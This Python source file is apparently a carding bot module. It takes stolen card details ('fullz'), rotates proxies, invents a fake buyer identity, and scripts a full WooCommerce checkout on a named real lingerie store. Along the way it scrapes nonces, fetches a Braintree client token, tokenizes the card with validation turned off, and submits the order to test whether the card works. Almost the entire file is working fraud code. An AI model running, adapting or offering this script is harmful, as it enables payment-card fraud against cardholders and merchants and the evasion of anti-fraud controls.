import asyncio
import base64
import random
import time
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import httpx
from FUNC.defs import *
import json


class CurlWrapper:
    def __init__(self):
        self.cookies = {}

    def delete_cookie(self):
        self.cookies = {}

    async def get(self, url, headers=None, cookie=None, proxy=None):
        try:
            if cookie and cookie not in self.cookies:
                self.cookies[cookie] = {}
            
            headers_dict = {}
            if headers:
                if isinstance(headers, list):
                    for header in headers:
                        if ': ' in header:
                            key, value = header.split(': ', 1)
                            headers_dict[key] = value
                else:
                    headers_dict = headers
            
            client = httpx.AsyncClient(
                timeout=30,
                proxies=proxy,
                follow_redirects=True,
                cookies=self.cookies.get(cookie, {})
            )
            
            response = await client.get(url, headers=headers_dict)
            
            if cookie:
                self.cookies[cookie] = client.cookies.jar._cookies
            
            await client.aclose()
            return SimpleNamespace(success=True, body=response.text, status_code=response.status_code)
        except Exception as e:
            return SimpleNamespace(success=False, body=str(e), status_code=None)

    async def post(self, url, data=None, headers=None, cookie=None, proxy=None):
        try:
            if cookie and cookie not in self.cookies:
                self.cookies[cookie] = {}
            
            headers_dict = {}
            if headers:
                if isinstance(headers, list):
                    for header in headers:
                        if ': ' in header:
                            key, value = header.split(': ', 1)
                            headers_dict[key] = value
                else:
                    headers_dict = headers
            
            client = httpx.AsyncClient(
                timeout=30,
                proxies=proxy,
                follow_redirects=True,
                cookies=self.cookies.get(cookie, {})
            )
            
            response = await client.post(url, data=data, headers=headers_dict)
            
            if cookie:
                self.cookies[cookie] = client.cookies.jar._cookies
            
            await client.aclose()
            return SimpleNamespace(success=True, body=response.text, status_code=response.status_code)
        except Exception as e:
            return SimpleNamespace(success=False, body=str(e), status_code=None)


class Tools:
    def __init__(self):
        pass

    def get_user(self):
        # Create a user object similar to the PHP code
        class User:
            def __init__(self):
                self.first = "John"
                self.last = "Doe"
                self.email = f"john.doe{random.randint(1, 9999)}@example.com"
                self.guid = f"{random.randint(1000000, 9999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
        
        return User()
    
    def gen_pass(self, length):
        import string
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))


def getstr(haystack, start, end):
    try:
        start_pos = haystack.index(start) + len(start)
        end_pos = haystack.index(end, start_pos)
        return haystack[start_pos:end_pos]
    except:
        return ""


class SimpleNamespace:
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)


async def create_shopify_charge(fullz, session):
    """
    Process a credit card payment through the Kissme-Lingerie checkout system.
    
    Args:
        fullz (str): Credit card details in format "cc|month|year|cvv"
        session: HTTP session object
        
    Returns:
        str: Raw result of the charge attempt to be processed by response.py
    """
    retry = 0
    is_retry = False
    
    curlx = CurlWrapper()
    tools = Tools()
    
    while True:
        try:
            if is_retry:
                retry += 1
                curlx.delete_cookie()
            
            if retry > 2:
                return "Maximum Retries Reached"
            
            is_retry = True
            
            # Get proxy from the format used in the bot
            proxies = await get_proxy_format()
            
            fake = tools.get_user()
            cookie = str(random.randint(10000000, 99999999))
            
            # Add item to cart
            data = 'attribute_pa_color=black&quantity=1&add-to-cart=16775&product_id=16775&variation_id=16778'
            r1 = await curlx.post('https://kissme-lingerie.com/shop/accessories/scarves/2-piece-knit-hat-gloves-set/', data, None, cookie, proxies)
            
            if not r1.success:
                continue
            
            # Go to checkout
            headers = [
                'Authority: kissme-lingerie.com',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
                "Sec-Ch-Ua: \"Chromium\";v=\"103\", \".Not/A)Brand\";v=\"99\"",
                'Sec-Ch-Ua-Mobile: ?1',
                "Sec-Ch-Ua-Platform: \"Android\"",
                'Sec-Fetch-Dest: document',
                'Sec-Fetch-Mode: navigate',
                'Sec-Fetch-Site: none',
                'Sec-Fetch-User: ?1',
                'Upgrade-Insecure-Requests: 1',
                'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36'
            ]
            
            r2 = await curlx.get('https://kissme-lingerie.com/checkout/', headers, cookie, proxies)
            
            if not r2.success:
                continue
            
            # Extract tokens
            _wpnonce_v1 = getstr(r2.body, '_wpnonce" value="', '"').strip()
            client_token_nonce = getstr(r2.body, 'credit_card","client_token_nonce":"', '"').strip()
            update_order_review_nonce = getstr(r2.body, 'update_order_review_nonce":"', '"').strip()
            
            if not _wpnonce_v1 or not client_token_nonce or not update_order_review_nonce:
                empty = 'Second Request Tokens is Empty'
                continue
            
            # Update order review
            data = f'security={update_order_review_nonce}&payment_method=braintree_credit_card&country=US&state=NY&postcode=10509&city=Brewster&address=12+main+street&address_2=&s_country=US&s_state=NY&s_postcode=10509&s_city=Brewster&s_address=12+main+street&s_address_2=&has_full_address=true&post_data=billing_first_name%3D{fake.first}%26billing_last_name%3D{fake.last}%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D12%2520main%2520street%26billing_address_2%3D%2'
            
            headers = [
                'Authority: kissme-lingerie.com',
                'Accept: */*',
                'Accept-Language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
                'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
                'Origin: https://kissme-lingerie.com',
                'Referer: https://kissme-lingerie.com/checkout/',
                "Sec-Ch-Ua: \"Chromium\";v=\"103\", \".Not/A)Brand\";v=\"99\"",
                'Sec-Ch-Ua-Mobile: ?1',
                "Sec-Ch-Ua-Platform: \"Android\"",
                'Sec-Fetch-Dest: empty',
                'Sec-Fetch-Mode: cors',
                'Sec-Fetch-Site: same-origin',
                'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36',
                'X-Requested-With: XMLHttpRequest'
            ]
            
            r3 = await curlx.post('https://kissme-lingerie.com/?wc-ajax=update_order_review', data, headers, cookie, proxies)
            
            if not r3.success:
                continue
            
            _wpnonce_v2 = getstr(r3.body, '_wpnonce\\" value=\\"', '\\"').strip()
            
            if not _wpnonce_v2:
                empty = 'Third Request Token is Empty'
                continue
            
            # Get client token
            data = f'action=wc_braintree_credit_card_get_client_token&nonce={client_token_nonce}'
            
            headers = [
                'Authority: kissme-lingerie.com',
                'Accept: */*',
                'Accept-Language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
                'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
                'Origin: https://kissme-lingerie.com',
                'Referer: https://kissme-lingerie.com/checkout/',
                'Sec-Ch-Ua: \"Chromium\";v=\"103\", \".Not/A)Brand\";v=\"99\"',
                'Sec-Ch-Ua-Mobile: ?1',
                'Sec-Ch-Ua-Platform: \"Android\"',
                'Sec-Fetch-Dest: empty',
                'Sec-Fetch-Mode: cors',
                'Sec-Fetch-Site: same-origin',
                'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36',
                'X-Requested-With: XMLHttpRequest'
            ]
            
            r4 = await curlx.post('https://kissme-lingerie.com/wp-admin/admin-ajax.php', data, headers, cookie, proxies)
            
            if not r4.success:
                continue
            
            authorization = getstr(r4.body, 'data":"', '"').strip()
            
            if not authorization:
                empty = 'Fourth Request Token is Empty'
                continue
            
            b3_data = json.loads(base64.b64decode(authorization))
            
            if not b3_data.get("authorizationFingerprint") or not b3_data.get("merchantId"):
                empty = 'Third Request Tokens is Empty'
                continue
            
            authorizationFingerprint = b3_data["authorizationFingerprint"]
            
            cc, mes, ano, cvv = fullz.split("|")
            sessionId = fake.guid[:-6]
            
            # Tokenize credit card
            data = json.dumps({
                "clientSdkMetadata": {
                    "source": "client",
                    "integration": "custom",
                    "sessionId": sessionId
                },
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": cc,
                            "expirationMonth": mes,
                            "expirationYear": ano,
                            "cvv": cvv,
                            "cardholderName": f"{fake.first} {fake.last}"
                        },
                        "options": {
                            "validate": False
                        }
                    }
                },
                "operationName": "TokenizeCreditCard"
            })
            
            headers = [
                f"authorization: Bearer {authorizationFingerprint}",
                'braintree-version: 2018-05-10',
                'content-type: application/json'
            ]
            
            r5 = await curlx.post('https://payments.braintree-api.com/graphql', data, headers, cookie, proxies)
            
            if not r5.success:
                continue
            
            token = getstr(r5.body, 'token":"', '"')
            
            if not token:
                empty = 'Fifth Request Token is Empty'
                continue
            
            correlation_id = tools.gen_pass(32)
            
            cc_type_map = {
                '3': 'american-express',
                '4': 'visa',
                '5': 'master-card',
                '6': 'discover'
            }
            cc_type = cc_type_map.get(cc[0], 'visa')
            
            # Complete checkout
            data = f'billing_first_name={fake.first}&billing_last_name={fake.last}&billing_company=&billing_country=US&billing_address_1=12+main+street&billing_address_2=&billing_city=Brewster&billing_state=NY&billing_postcode=10509&billing_phone=2564567654&billing_email={fake.email}&kco_shipping_data=false&account_password=&ship_to_different_address=1&shipping_first_name={fake.first}&shipping_last_name={fake.last}&shipping_company=&shipping_country=US&shipping_address_1=12+main+street&shipping_address_2=&shipping_city=Brewster&shipping_state=NY&shipping_postcode=10509&order_comments=&payment_method=braintree_credit_card&wc-braintree-credit-card-cardholder-name={fake.first}+{fake.last}&wc-braintree-credit-card-card-type={cc_type}&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=27.9&wc-braintree-credit-card-payment-nonce={token}&wc-braintree-credit-card-device-data=%7B%22correlation_id%22%3A%22{correlation_id}%22%7D&terms=on&terms-field=1&woocommerce-process-checkout-nonce={_wpnonce_v2}&_wp_http_referer=%2Fcheckout%2F'
            
            headers = [
                'Authority: kissme-lingerie.com',
                'Accept: application/json, text/javascript, */*; q=0.01',
                'Accept-Language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
                'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
                'Origin: https://kissme-lingerie.com',
                'Referer: https://kissme-lingerie.com/checkout/',
                'Sec-Ch-Ua: \"Chromium\";v=\"103\", \".Not/A)Brand\";v=\"99\"',
                'Sec-Ch-Ua-Mobile: ?1',
                'Sec-Ch-Ua-Platform: \"Android\"',
                'Sec-Fetch-Dest: empty',
                'Sec-Fetch-Mode: cors',
                'Sec-Fetch-Site: same-origin',
                'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36',
                'X-Requested-With: XMLHttpRequest'
            ]
            
            r6 = await curlx.post('https://kissme-lingerie.com/?wc-ajax=checkout', data, headers, cookie, proxies)
            
            if not r6.success:
                continue
            
            return r6.body
            
        except Exception as e:
            return str(e)